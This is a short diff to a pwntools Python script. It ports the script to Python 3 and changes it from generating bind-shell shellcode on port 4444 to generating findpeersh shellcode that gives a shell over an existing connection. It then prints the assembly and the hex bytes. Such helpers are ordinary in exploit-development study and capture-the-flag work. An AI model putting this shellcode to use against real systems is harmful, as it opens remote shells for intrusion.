@@ -1,4 +1,4 @@
-#!/usr/bin/env python2
+#!/usr/bin/env python3
 
 from pwn import *
 import sys
@@ -10,7 +10,7 @@ else:
 
 context(arch = arch, os = 'linux')
 
-assembly = shellcraft.bindsh(4444)
-print '    /* bind shell shellcode on %s architecture */' % arch
-print assembly
-print '    /* Assembled: %s */' % enhex(asm(assembly))
+assembly = shellcraft.findpeersh()
+print('    /* findpeersh shellcode on %s architecture */' % arch)
+print(assembly)
+print('    /* Assembled: %s */' % enhex(asm(assembly)))
